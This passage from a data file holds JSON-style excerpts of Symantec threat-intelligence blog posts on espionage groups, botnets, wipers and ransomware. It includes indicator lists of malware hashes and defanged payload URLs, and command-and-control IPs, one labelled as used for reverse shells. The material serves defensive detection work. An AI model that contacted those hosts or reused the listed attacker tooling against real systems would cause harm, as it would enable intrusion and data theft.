downloader\n4acd4335ca43783ff52c0ccbb7e757ea14fb261c33d08268e85ed0ac34e0abec - .NET downloader\n47718762dc043f84fb641b1e0a8c65401160cc2e558fd38c14d5d35a114b93cb - .NET downloader\na539961f80feb689546a2e334b03aed81252a04fae032e2d28ed9a7000b3afff - .NET downloader\n07ca6122fde46d48f71bcde356d5eeb89040e4a6e83441968a9dade98dc36fe5 - .NET loader\n938f50cb2e2d670497209e8cef5bf1042f752b6bf76d1547d68040b5a27f618b - .NET loader\na257eeebba15afecf76b89a379e066e5ed79a2bb9da349c1fdb5a24316abc753 -  GuLoader\nf276c6a25d6b865c6202978f1d409e8b74e063263eab517f249cf6d3ad3fae4a - GuLoader\n3d0fd0444a9e295135ecfdc8c87ddc6dcdff63969c745e0218469332aef18dfe - GuLoader\nac98e6bf6d16904355b1c706bc2b79761a8b09044da40f2c8bce35142ef8bcc8 - GuLoader\nca75b0864d8308efe94eb0822de55eb7f5cfd482d2190100dfd00d433ee790a0 - GuLoader\n088110b0ee3588a4822049cf60fff31c67323a9b5993eae3104cc9737a47ce0c - GuLoader\nb4adbb5d017d6452c2e1700584261cd3170ee5a14ac658424945f15177494ba1 - GuLoader\n818284e7ea0a4bd64ba0eda664f51877ed8c6d35bf052898559dbf4ad8030968 - GuLoader\nfa6ca0a168f3400a00dc43f1be07296f4111d7ad9b275809217a9269dd613ae8 - GuLoader\nd5b3b1304739986298ba9b7c3ff8b40b3740233d6bb02437ce61a20ee87468bc - GuLoader\n8495a328fdd4afd33c3336e964802018d44c1dda15b804560743d6276e926218 - GuLoader\nce2ea1807d984e1392599d05f7ab742bae4f20f8ef80c5a514fbdeede2ff7e55 - Quasar RAT\ne933ec0f52cbc60b92134d48b08661b1af25c7d93ff5041fc704559b45bd85b8 - Netwire RAT\n6db5e2bb146b11182f29d03b036af4e195044f0ef7a8f7c4429f5d4201756b8f - Cobalt Strike\nf4fba2181668f766fdfbd1362420a53ac0b987f999c95baf5dbe235fd3bad4b8 - Cobalt Strike\nec2146655e2c04bf87b8db754dd2e92b8c48c4df47b64a9adc1252efd8618e62 - Fakelogonscreen\ne5633d656dea530a62f5ad2792f253e74453712be34d2eadfb49190f7a9ee10b - Malicious DLL used to register Helper Driver\n0440ef40c46fdd2b5d86e7feef8577a8591de862cfd7928cdbcc8f47b8fa3ffc - Signed Helper driver\n5090f311b37309767fb41fa9839d2770ab382326f38bab8c976b83ec727e6796 - Sharphound\n5e245281f4924c139dd90c581fc79105ea19980baa68eeccf5bf36ae613399b9 - PsExec\n31eb1de7e840a342fd468e558e5ab627bcb4c542a8fe01aec4d5ba01d539a0fc - Mimikatz\nNetwork Indicators\nhxxp://files[.]ddrive[.]online:444/load\nhxxp://85.239.34[.]152/download/XWO_UnBkJ213.bin\nhxxps://transmissive-basin[.]000webhostapp[.]com\nhxxps://udapte[.]adesy[.]in\nbanqueislamik[.]ddrive[.]online\nhxxps://transfer[.]sh/get/mKwvWI/NHmZJu.rtf\nhxxps://transfer[.]sh/get/RTPlqa/oISxUP.rtf\nhxxp://files[.]ddrive[.]online:4448/a\nhxxp://banqueislamik[.]ddrive[.]online:4448/ZPjH\nhxxp://46.246.86[.]12/ca3.exe\nhxxp://178.73.192[.]15/ca1.exe\npersonnel[.]bdm-sa[.]fr\n185.225.73[.]165", "source": "Symentec"}, {"title": "Introduction", "content": "On March 14, we discovered 81 potentially unwanted applications (PUAs) on the Microsoft Store, some of which display pornographic images and gambling content. While some have been removed, most of these apps are still available to download from the app store.\nThe apps cover a range of different categories such as sports, games, news, tips, etc. They appear to be published by more than 30 different developers. A full list of the 81 apps, as well as their store page links and author names, can be found in the table at the end of this blog.", "source": "Symentec"}, {"title": "Introduction", "content": "As we enter the busiest shopping period of the year, both offline and online retailers and consumers are facing risks to the security of their payment card data.\nFormjacking has surged in 2018-with Symantec blocking almost 700,000 formjacking attempts from mid-September to mid-November alone. This surge in formjacking is one of the big stories of 2018-withattackerslike Magecart using supply chain attacks and other tactics to inject malicious scripts into websites to steal payment card information.\nThere have also beenattackson point-of-sale (PoS) systems in bricks-and-mortar stores this year, though none so far that compare to the mega breaches of earlier this decade, which saw tens of millions of credit cards compromised in a single breach.", "source": "Symentec"}, {"title": "Best Practices", "content": "Formjacking\nVictims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection.\nWebsite owners should be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take:\nTest new updates, even seemingly legitimate ones, in small test environments or sandboxes first, to detect any suspicious behavior.\nBehavior monitoring of all activity on a system can also help identify any unwanted patterns and allow you to block a suspicious application before any damage can be done.\nProducers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website.\nWebsite owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script.\nPoint of Sale\nInstall and maintain a firewall to facilitate network segmentation.\nChange default system passwords and other security parameters.\nEncrypt transmission of cardholder data across open, public networks.\nUse and regularly update security software.\nUse strong authentication including two-factor authentication for remote systems.\nTest security systems, perform penetration testing, and implement a vulnerability management program.\nMaintain security policies and implement regular training for all personnel.\nImplement chip-and-PIN technology in your business.\nImplement system integrity and monitoring software to leverage features such as system lockdown, application control, or whitelisting.", "source": "Symentec"}, {"title": "Best Practices", "content": "Monitor your credit card bills so you will spot any suspicious transactions. You could even consider hiring the services of a credit monitoring company.\nOnly shop from well-known, secure websites and stores that are more likely to have good security measures in place. However, even well-known stores fall victim to cyber criminals, so while this may reduce your risk of exposure it doesn't eliminate it.", "source": "Symentec"}, {"title": "Introduction", "content": "A global partnership of security, software, telecommunications and financial services firms have struck a blow against the notorious Trickbot botnet by securing a court order directing hosting providers to take down its infrastructure. The order was obtainedin a U.S. lawsuit filed by Microsoftand the Financial Services Information Sharing and Analysis Center (FS-ISAC) against Trickbot's anonymous operators and was based on technical evidence provided by the Symantec, a division of Broadcom (NASDAQ: AVGO) Threat Hunter Team and others. The legal action marked the culmination of a years-long, cross-industry collaboration to find innovative ways to thwart a pernicious botnet that has fueled numerous cyber-crime sprees.\nInwritten testimony provided to the court, Symantec technical director Vikram Thakur said Trickbot has spread prolifically across the internet for years and become one of the most commonly blocked types of malware, suggesting it is now one of the world's largest botnets.\nThakur described the serious harm caused to users whose computers are infected with Trickbot and whose banking credentials and other sensitive information are frequently stolen by the attackers. He also described its impact on financial institutions, which have borne significant losses due to Trickbot fraud.\nIn recent times, Trickbot has been implicated in targeted ransomware attacks, where credentials stolen by the malware were used by the Ryuk ransomware operators to compromise victims' networks and encrypt all accessible computers. This assessment has beenconfirmed by Europol, which recently noted that \"the relationship between Emotet [another botnet], Ryuk and Trickbot is considered one of the most notable in the cybercrime world\".\nThe botnet's impact on banks and other financial sector organizations prompted a successful and close collaboration between the security industry and the financial sector, represented by FS-ISAC.\nUnlike prior legal \"takedown\" actions against botnets, this case did not involve seizure of malicious infrastructure or redirection of network traffic but instead relied upon intellectual-property laws to effectively evict the botnet operators from the command-and-control servers they need to maintain access to victim machines.", "source": "Symentec"}, {"title": "Introduction", "content": "The energy sector in Europe and North America is being targeted by a new wave ofcyber attacksthat could provide attackers with the means to severely disrupt affected operations. The group behind these attacks is known as Dragonfly. The group has been in operation since at least 2011 but has re-emerged over the past two years from a quiet periodfollowing exposure by Symantecand a number of other researchers in 2014. This \"Dragonfly 2.0\" campaign, which appears to have begun in late 2015, shares tactics and tools used in earlier campaigns by the group.\nThe energy sector has become an area of increased interest to cyber attackers over the past two years. Most notably,disruptions to Ukraine's power systemin 2015 and 2016 were attributed to a cyber attack and led to power outages affecting hundreds of thousands of people. In recent months, there have also been media reports ofattempted attacks on the electricity gridsin some European countries, as well as reports ofcompanies that manage nuclear facilities in the U.S. being compromisedby hackers.\nThe Dragonfly group appears to be interested in both learning how energy facilities operate and also gaining access to operational systems themselves, to the extent that the group now potentially has the ability to sabotage or gain control of these systems should it decide to do so. Symantec customers are protected against the activities of the Dragonfly group.", "source": "Symentec"}, {"title": "Best Practices", "content": "Dragonfly relies heavily on stolen credentials to compromise a network. Important passwords, such as those with high privileges, should be at least 8-10 characters long (and preferably longer) and include a mixture of letters and numbers. Encourage users to avoid reusing the same passwords on multiple websites and sharing passwords with others should be forbidden. Delete unused credentials and profiles and limit the number of administrative-level profiles created. Employ two-factor authentication (such asSymantec VIP) to provide an additional layer of security, preventing any stolen credentials from being used by attackers.\nEmphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This should include the deployment of regularly updated firewalls as well as gateway antivirus, intrusion detection or protection systems (IPS), website vulnerability with malware protection, and web security gateway solutions throughout the network.\nImplement and enforce a security policy whereby any sensitive data is encrypted at rest and in transit. Ensure that customer data is encrypted as well. This can help mitigate the damage of potential data leaks from within an organization.\nImplement SMB egress traffic filtering on perimeter devices to prevent SMB traffic leaving your network onto the internet.\nEducate employees on the dangers posed by spear-phishing emails, including exercising caution around emails from unfamiliar sources and opening attachments that haven't been solicited. A full protection stack helps to defend against emailed threats, includingSymantec Email Security.cloud, which can block email-borne threats, andSymantec Endpoint Protection, which can block malware on the endpoint.Symantec Messaging Gateway'sDisarm technology can also protect computers from threats by removing malicious content from attached documents before they even reach the user.\nUnderstanding the tools, techniques, and procedures (TTP) of adversaries through services likeDeepSight Adversary Intelligencefuels effective defense from advanced adversaries like Dragonfly 2.0. Beyond technical understanding of the group, strategic intelligence that informs the motivation, capability, and likely next moves of the adversaries ensures more timely and effective decisions in proactively safeguarding your environment from these threats.", "source": "Symentec"}, {"title": "Introduction", "content": "The Witchetty espionage group (aka LookingFrog) has been progressively updating its toolset, using new malware in attacks on targets in the Middle East and Africa. Among the new tools being used by the group is a backdoor Trojan (Backdoor.Stegmap) that employs steganography, a rarely seen technique where malicious code is hidden within an image.\nIn attacks between February and September 2022, Witchetty targeted the governments of two Middle Eastern countries and the stock exchange of an African nation. The attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities to install web shells on public-facing servers before stealing credentials, moving laterally across networks, and installing malware on other computers.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\n619b64c6728f9ec27bba7912528a4101a9c835a547db6596fa095b3fe628e128       LookBack backdoor\ne597aae95dcaccc5677f78d38cd455fa06b74d271fef44bd514e7413772b5dcb         LookBack backdoor\nce3293002a9681736a049301ca5ed6d696d0d46257576929efbb638545ecb78e    LookBack backdoor\n73bf59c7f6a28c092a21bf1256db04919084aca5924bbd74277f8bda6191b584        LookBack backdoor\nacc52983d5f6b86bec6a81bc3fbe5c195b469def733f7677d681f0e405a1049b         LookBack backdoor\nf91e44ff423908b6acf8878dced05dc7188ddab39d1040e0d736f96f0a43518d         LookBack backdoor\ne7fcc98005cff9f406a5806222612c20dae3e47c469ff6028310847a599d1a38           LookBack backdoor\n104873d692af36173cb39f8b46f2080c8ce1a1a52d60c69e1034e2033ba95f7a         Possible LookBack dropper\n3b715112ac93e4cd5eaa7760b5670760fd25d0fec68f6a493624fa23c1c6e042         Backdoor.Stegmap\n8030d3472eac3c703ae918600a78a6a89800b157d76f333734ed1af5101d04ed     Custom proxy tool\n17e60fc72b5398060138f72b3ecb3b09c37243e3b2905df94b7f5b44d6157806       Custom proxy tool\n97ccac64927da6f46b3a775d2feb10c271b676e6b124e5bf84e9722c9dc4f093         Custom port scanner\n2d5daaae2fe2e7cd6c47ab4c5f824f670969d3fe88bfd3e4512967378c61924d         Custom persistence tool\nd8326470d5631e58409401fbadfc8157ee247c32b368fb4be70c2b8f8f88427e        Keylogger\na6cf19ab0dc0f0fb9ed4e6da13925a80d92c326a59131991eaf207d92bc61e13        LSASS credential stealer\n348d897e952c0f5872c35ea1b15eab802791b865d3c6ad3a27693680a28056cd     Korplug/PlugX loader\n1c5ad98a27551e6da3502cdc9ecb232f0d1a343b002c1760f350298fee8df202        Plink\ndc13f67a5c52488709056f51a63f3fa1056db71616f83cbb5f1f1949395248be          SecretsDump\n16bef09e16119f1754a6b4283e93ff7a17cfdd7c043c3ff05a3d41f128ead52e            FSCAN\nd4e2106f9d5294c04ccc02d59882785d548caf4904c8c00446d906bbec2629b2       RAR compressor\n31443b7329b1bdbcf0564e68406beabf2a30168fdcb7042bca8fb2998e3f11c5         Mimikatz\nc4e9267138cc030e9e87c15c7ff3a15f0a7ece3c39872f354e74842e871e8dc1          Unknown malware\n87e507f8fa0f881744afa3a4d5790297bb942230a08134becc150fff511f295b            Unknown malware\n59e3bbf97bc08814c56f9aeebaf890a168551d3d9f2ac3efdc8247ecc1732f73         Unknown file\n1242d1372ab50a48ad9acec06b4f2a154b072dc494fa392e6647e736135fa636       Corrupted File\nf3ae5c2ee98257d0b53d90b62eee18427918af41cb44f8097aa7c3f257c8f7ae         7-Zip file\n0b29be26d5caae7cf46eaf9345eea7d9fd7e808b3334e2a2043232d450a648ee      7-Zip file\ne27a24e4e99e623566d8a43eb7e562d27c28a7c746d533d36f56312e9a317c2b   7-Zip file\n681c22f79e5ec794858172378ed0285ef4da87f4f2dc8545bf304ce1f936529c           China Chopper\nbaa5c96ec2c51b601a6808428dbe0dc5e274e2ac65c38c465c5a74a2deb962c6       China Chopper\n74b1c46bfda5d2be5c674a6c53c2ad8f4f8d5c5b1cc010f17c6c538e117e013f           China Chopper\n5972621204b6503773bfaa58b6aadae073d94c781d89e49557e4d9ecfe4049ab      China Chopper\n59bfccc3a6f8e4f737c7b483ec13ba36e53f12af658529a9dd8b0df2b235c0de           China Chopper\nd0992dce0769d6ac23076635c902b56daeda17bab5c30f764991c0844141f61f       China Chopper\n3859784f390174acc2eeabc82649f7e13f5db592978192b9243c38c254b7e614        China Chopper\n1b9e723c70f0a682d4f3a5a7d98a89697b8509a07c8986de041b05806c04d1f9       China Chopper\nee5f18e7dcb251a09da9650ac15723b0607282e5befc829d599005a322ac239d      China Chopper\n78718feee5ee5683827e5068d73922c8cd2cf297fb1818fb2440babb8d589609       China Chopper\ne5f98a1b0d37a09260db033aa09d6829dc4788567beccda9b8fef7e6e3764848       Web shell\n469ebdd2f6ecdce9558f3e546ef2814c5e1ad274dcd23bf4613964a0c685d889        Batch script\n45549618493cf78facbfedba54e662408b7ebaabe3352119974b6500d11edc85       Batch script\nd273b4710800ede37617c3b6e3d58e67e45e6b54556dde468d18e48e006a79f2    Script\nd66a019a3cec95b6292215cf6fce4c0837f4b1de3c8af232d11ea291c87db698          Script\n57e729442e8d6a06857f71538c0c11a5a49ff5d6136c05f20f391ae9eb95c2da          Script\na7baecdbbf55825db281a417a9e11cd8d7b8c3ab5679d2474352091b431c6900     Script\n1b75fe197f71809dea790f9d1357c0bb5e396f42dfcd4f966c64f5f71b39a865           Script\nde5206a50a0ef8c7f00955ffc2f5034c9d588f8736819387be9f2572666aaa4b           Script\n084d4a46bb5b6a1ff7dfc2dd7be6f2023d608f5883e345a67fb98ed22188f1bd         Script\n5.252.176[.]3                      LookBack C&C server\na.bigbluedc[.]com           LookBack C&C server\n185.225.19[.]55                 Remote IP (Malware)\n153.92.1[.]125                    Remote IP (Malware)\n194.180.174[.]254             Remote IP (Malware)", "source": "Symentec"}, {"title": "Introduction", "content": "Duqu 2.0, the cyberespionage tool that was used to compromise security firm Kaspersky Lab, has also been used in a number of other attack campaigns against a range of targets, including several telecoms firms. Analysis by Symantec concurs withKaspersky's assessment todaythat Duqu 2.0 (detected by Symantec as W32.Duqu.B) is an evolution of the older Duqu worm, which wasused in a number of intelligence-gathering attacks against a range of industrial targets before it was exposed in 2011. Although their functionalities were different, the original Duqu worm had many similarities with the Stuxnet worm used to sabotage the Iranian nuclear development program.", "source": "Symentec"}, {"title": "Conclusion", "content": "Based on our analysis, Symantec believes that Duqu 2.0 is an evolution of the original threat, created by the same group of attackers. Duqu 2.0 is a fully featured information-stealing tool that is designed to maintain a long term, low profile presence on the target's network. Its creators have likely used it as one of their main tools in multiple intelligence gathering campaigns.\nGiven that activity surrounding the original version of Duqu dropped off following its discovery, it is likely that the group may now retreat before re-emerging with new malware.", "source": "Symentec"}, {"title": "Introduction", "content": "Attackers most likely linked to Iran have attacked a string of telecoms operators in the Middle East and Asia over the past six months, in addition to a number of IT services organizations and a utility company.\nOrganizations in Israel, Jordan, Kuwait, Saudi Arabia, the United Arab Emirates, Pakistan, Thailand, and Laos were targeted in the campaign, which appears to have made no use of custom malware and instead relied on a mixture of legitimate tools, publicly available malware, and living-off-the-land tactics. While the identity of the attackers remains unconfirmed, there is some evidence to suggest a link to the Iranian Seedworm (aka MuddyWater) group.  The targeting and tactics are consistent with Iranian-sponsored actors.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "ae5d0ad47328b85e4876706c95d785a3c1387a11f9336844c39e75c7504ba365 \u2013 Ligolo\ne0873e15c7fb848c1be8dc742481b40f9887f8152469908c9d65930e0641aa6b \u2013 Ligolo\n22e7528e56dffaa26cfe722994655686c90824b13eb51184abfe44d4e95d473f \u2013 Hidec\nb0b97c630c153bde90ffeefc4ab79e76aaf2f4fd73b8a242db56cc27920c5a27 \u2013 Nping\nb15dcb62dee1a8499b8ac63064a282a06abf0f7d0302c5e356cdb0c7b78415a9 \u2013 LSASS Dumper\n61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2 \u2013 SharpChisel\nccdddd1ebf3c5de2e68b4dcb8fbc7d4ed32e8f39f6fdf71ac022a7b4d0aa4131 \u2013 Password Dumper\nfacb00c8dc1b7ed209507d7c56d18b2c542c4e0b2986b9bfaf1764d8e252576b \u2013 CrackMapExec\n1a107c3ece1880cbbdc0a6c0817624b0dd033b02ebaf7fa366306aaca22c103d \u2013 ProcDump\n916cc8d6bf2282ae0d2db587f4f96780af59e685a1f1a511e0b2b276669dc802 \u2013 ProcDump\ne2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496 \u2013 ProcDump\nf6600e5d5c91ed30d8203ef2bd173ed0bc431453a31c03bc363b89f77e50d4c5 - SOCKS5 proxy server\n6d73c0bcdf1274aeb13e5ba85ab83ec00345d3b7f3bb861d1585be1f6ccda0c5 \u2013 Keylogger\n912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 \u2013 Mimikatz\n96632f716df30af567da00d3624e245d162d0a05ac4b4e7cbadf63f04ca8d3da \u2013 Mimikatz\nbee3d0ac0967389571ea8e3a8c0502306b3dbf009e8155f00a2829417ac079fc \u2013 Mimikatz\nd9770865ea739a8f1702a2651538f4f4de2d92888d188d8ace2c79936f9c2688 - Mimikatz", "source": "Symentec"}, {"title": "Introduction", "content": "UPDATE February 24, 2022, 13:42:This blog has been updated with details about ransomware being used as a possible decoy during some wiper attacks.\nUPDATE February 25, 2022, 17:00:This blog has been updated with details on how a known Microsoft SQL Server  vulnerability (CVE-2021-1636) was exploited in at least one attack.\nA new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division ofBroadcom Software, has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors.\nTrojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper\nOnce run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\n1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 \u2013 Trojan.Killdisk\n0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da \u2013 Trojan.Killdisk\na64c3e0522fad787b95bfb6a30c3aed1b5786e69e88e023c062ec7e5cebf4d3e \u2013 Trojan.Killdisk\n4dc13bb83a16d4ff9865a51b3e4d24112327c526c1392e14d56f20d6f4eaf382 - Ransomware", "source": "Symentec"}, {"title": "Introduction", "content": "A new strain of the Petya ransomware started propagating on June 27, 2017, infecting many organizations.\nSimilar toWannaCry, Petya uses the EternalBlue exploit as one of the means to propagate itself. However, it also uses classic SMB network spreading techniques, meaning that it can spread within organizations, even if they have patched against EternalBlue.", "source": "Symentec"}, {"title": "Protection", "content": "Symantec has the following IPS protection in place to protect customers against these attacks:\nOS Attack: Microsoft SMB MS17-010 Disclosure Attempt(released May 2, 2017)\nAttack: Shellcode Download Activity(released April 24, 2017)\nAttack: SMB Double Pulsar Ping\nWeb Attack: Shellcode Download Activity 4\nRansom.Petya\nRansom.Petya!g1\nSONAR.Module!gen3\nTrojan.gen\nFor further detail seehttps://email.status.symantec.com/\nSymantec is continuing to analyze this threat and will post further information as soon as it becomes available.", "source": "Symentec"}, {"title": "Introduction", "content": "Browser-based cryptocurrency mining activity exploded in the last few months of 2017. After many years of deathly silence, the catalyst appears to be the launch of a new browser-based mining service in September by Coinhive. This service wraps everything up nicely in an easy-to-use package for website owners and has injected new life into an idea that was long thought of as dead and buried.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America.\nThe group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018.\nAnalysts in ourDeepSight Managed Adversary and Threat Intelligence(MATI) team have found a new backdoor,Backdoor.Powemuddy, new variants of Seedworm's Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several post-compromise tools the group uses to exploit victims once they have established a foothold in their network.", "source": "Symentec"}, {"title": "Targets", "content": "We analyzed data on 131 victims that were compromised by Seedworm's Powermud backdoor from late September to mid-November 2018.\nObserved Seedworm victims were located primarily in Pakistan and Turkey, but also in Russia, Saudi Arabia, Afghanistan, Jordan, and elsewhere. Additionally, the group compromised organizations in Europe and North America that have ties to the Middle East.\nAdditionally, during our analysis of Powermud victims, we were able to identify the probable industry sector for 80 of the 131 unique victims. The telecommunications and IT services sectors were the main targets. Entities in these sectors are often \"enabling victims\" as telecommunications providers or IT services agencies and vendors could provide Seedworm actors with further victims to compromise. Successfully compromising victims in these two industries provides additional clues about the sophistication and skills of the Seedworm group.\nThe next most common group of victims was in the oil and gas sector. All 11 victims in this group belong to one Russian firm that is active in the Middle East. Only one of these 11 victims was physically located in Russia; the rest were spread out across North America, the Middle East, Africa, and Asia.\nUniversities and embassies were the next most common targets. The universities were in the Middle East and the embassies were primarily based in Europe representing Middle East countries. Two major non-governmental organizations (NGOs) were also compromised; we identified seven victims who worked within these global public health organizations.\nSymantec has notified the appropriate public and private sector partners regarding Seedworm's latest targets, tools and techniques..", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "The following indicators are specific to Seedworm:\nNetwork\n104.237.233.60 IP used for reverse shell C&C\n78.129.222.56 Powemuddy/Powermud delivery IP\n78.129.139.148 Powemuddy C&C\n31.171.154.67 Powemuddy C&C\n46.99.148.96 former Powemudddy C&C\n79.106.224.203 Powemuddy C&C\n185.34.16.82 Powemuddy C&C\nFile names", "source": "Symentec"}, {"title": "Introduction", "content": "We took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from July, August, and September 2020\nFrom significant increases in Emotet and Cobalt Strike activity to a spike in the number of server vulnerability exploit attempts, let's take a quick look at the trends that shaped the cyber security threat landscape in the third quarter of 2020.", "source": "Symentec"}, {"title": "Introduction", "content": "This is a follow-up to our previous blog onCOVID-19 related spam campaigns. This blog will share some insight on the latest wave of COVID-19 themed spam campaigns and how Email Threat Isolation (ETI) from Symantec stops these emails from accomplishing their goals.\nSymantec has continued to observe numerous malicious email campaigns taking advantage of the global panic surrounding the coronavirus outbreak. While we previously discussed malspam (malware bearing) emails, now a wave of text-based spam campaigns have emerged. These emails do not contain any malicious attachments and instead rely on what is written in the email to trick users into handing over information or money.", "source": "Symentec"}, {"title": "Protection", "content": "Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering systems, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale.", "source": "Symentec"}, {"title": "Introduction", "content": "In recent years two-factor or multi-factor authentication (MFA) has been touted as the way to protect your personal and business accounts from attack. This led to the wide adoption of MFA - from corporate accounts to social media profiles, almost all provide the option of enabling MFA, with many requiring it.\nThis means that, for attackers, stealing credentials or brute forcing passwords is no longer enough - if they don't have access to victims' multi-factor access token or code they will still not be able to access their accounts. The increasing use of MFA means that attackers have had to endeavor to find ways to bypass it, or avoid carrying out attacks that may be stalled by it. When we look at recent high-profile attacks, such as SolarWinds, the Microsoft Exchange Server ProxyLogon attacks, and the vulnerabilities found in Pulse Secure VPN recently, all these attacks help attackers avoid the hurdle of needing to overcome MFA.\nWhile MFA has perhaps only gained wide adoption in the last couple of years, attacks attempting to bypass MFAdate as far back as 2011, when RSA Security was forced to replace 40 million SecurID tokens - which were used for MFA at the time - after the company was hacked.\nHowever, recently, there have been some more notable examples of attacks that attempt to either bypass MFA, or eradicate the need to bypass it at all, with five of these outlined in this blog.", "source": "Symentec"}, {"title": "Introduction", "content": "The North Korean-linked Stonefly group is continuing to mount espionage attacks against highly specialized engineering companies with a likely goal of obtaining sensitive intellectual property.\nStonefly specializes in mounting highly selective targeted attacks against targets that could yield intelligence to assist strategically important sectors such as energy, aerospace, and military equipment. Virtually all of the technologies it appears to be interested in have military as well as civilian uses and some could have applications in the development of advanced weaponry.", "source": "Symentec"}, {"title": "Targets", "content": "While Stonefly's tools and tactics continue to evolve, there are some common threads between this recent activity and previous attacks, such as its ongoing development of the Preft backdoor and heavy reliance on open-source tools.\nThe group's capabilities and its narrow focus on acquiring sensitive information make it one of the most potent North Korean cyber threat actors operating today.", "source": "Symentec"}, {"title": "Introduction", "content": "A longstanding cyberespionage campaign has been targeting mainly Japanese organizations with its own custom-developed malware (Backdoor.Daserf). The group, known to Symantec as Tick, has maintained a low profile, appearing to be active for at least 10 years prior to discovery.\nIn its most recent campaign, Tick employed spear-phishing emails and compromised a number of Japanese websites in order to infect a new wave of victims. The group is highly selective in its approach and only appears to deploy its full range of tools once it establishes that the compromised organization is an intended target. Tick also uses a range of hacktools to map the victim's network and attempt to escalate privileges further.\nDaserf's main purpose is information stealing and the Trojan is capable of gathering information from infected computers and relaying it back to attacker-controlled servers. Tick's most recent attacks have concentrated on the technology, aquatic engineering, and broadcasting sectors in Japan.", "source": "Symentec"}, {"title": "Targets", "content": "The use of compromised websites to infect victims results in unintentional infections, making it difficult to identify the motives of the attacker. By searching for evidence of post-infection activity, Symantec identified seven organizations where Tick had mounted persistent post-compromise attacks. These organizations were primarily large Japanese technology, engineering, and media firms.\nThe seven organizations therefore appear to be Tick's intended targets. In addition to seeing post-compromise tools used in these attacks, the length of time the attackers were active on the networks provided additional evidence that these were high-value targets. The longest time Tick was active in a victim's environment was 18 months. The average timeframe was five months and the number of infected hosts in a victim's network ranged from 3 to 15 systems.", "source": "Symentec"}, {"title": "Conclusion", "content": "Tick has left a trail of evidence indicating that its activity began as early as 2006. In earlier attacks, the group used malicious Microsoft Word documents to infect victims, with compromised websites being added to the mix as a more recent attack vector.\nTick appears to be a well-organized group, with the funding and capability to develop and update its malware. It has the ability to compromise legitimate infrastructure to use for malware distribution and has access to stolen digital certificates to sign its malware when needed. Tick primarily uses purchased infrastructure for its C&C servers and has been able to stay off the radar since 2006.\nTick exhibits all the hallmarks of an advanced cyberespionage group. The long lifespan of the group, as well as the consistent targeted attacks against specific industries, support this theory. The individuals or organization behind Tick's operations has an interest in Japanese technology along with Japanese media and broadcasting organizations. While Tick's tactics may change over time, the group's history indicates that its focus will continue to be a narrow range of targets, mainly in Japan.", "source": "Symentec"}, {"title": "Introduction", "content": "Unfortunately, in this new COVID-19 era it's not just our computers we have to protect from infection, but also ourselves and our loved ones. Along with social distancing, wearing a mask, and washing our hands, technology is also playing a part in the fight against the pandemic. COVID-19 contact tracing apps have been deployed by both governments and organizations around the globe.\nNot all contact tracing apps are equal and an app used by a company to contact-trace its employees while at work can have different objectives than those of an app used by a government to contact-trace its citizens. Any app with tracing functionality should follow best practices when it comes to the collection of data and how that data is stored and used, and there are different rules and regulations relating to this in different parts of the world. This report will analyze 25 popular COVID-19 tracing apps to find out how they do when it comes to security and privacy. However, first, we need to lay out which type of apps we will be looking at and how they work, as well as some of the laws and usage requirements that can shape contact tracing apps.", "source": "Symentec"}, {"title": "Introduction", "content": "We recently discovered a malicious toolkit (detected asAndroid.Rootnik.B) masquerading as pornographic apps in the thousands, which are primarily targeted at Chinese-speaking users. This toolkit has a broad range of capabilities, including:\nRooting Android devices\nInjecting malicious code into legitimate apps\nSubscribing to premium services and sending premium messages\nSilently downloading/installing risky apps\nThe apps find their way onto devices via app-centric websites, forums, and torrent sites. These can also spread over popular social messaging networks.", "source": "Symentec"}, {"title": "Introduction", "content": "The Elfin espionage group (aka APT33) has remained highly active over the past three years, attacking at least 50 organizations in Saudi Arabia, the United States, and a range of other countries.\nThe group, which first became active in late 2015 or early 2016, specializes in scanning for vulnerable websites and using this to identify potential targets, either for attacks or creation of command and control (C&C) infrastructure. It has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors.", "source": "Symentec"}, {"title": "Targets", "content": 